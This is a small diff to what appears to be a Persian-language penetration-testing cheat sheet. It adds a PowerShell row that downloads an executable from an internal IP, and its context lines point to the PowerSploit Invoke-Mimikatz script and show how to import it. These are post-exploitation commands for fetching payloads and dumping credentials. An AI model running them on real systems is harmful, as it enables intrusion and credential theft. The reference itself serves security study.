@@ -725,6 +725,7 @@ Step by step instructions on room362.com for step below
 | https://gist.githubusercontent.com/zhilich/b8480f1d22f9b15d4fdde07ddc6fa4ed/raw/8078a51bbfa18df36d8e890fefe96a06891dd47d/SimpleHttpServer.ps1 | وبسرور با پورت ۸۰۵۰ |
 | https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 | استفاده از mimikatz |
 | فراخوانی فایل های ps1 | Import-Module .\Invoke-Mimikatz.ps1 |
+| دریافت و ذخیره سازی فایل | iwr -uri http://10.10.10.10/file -o file.exe |
 
 
 
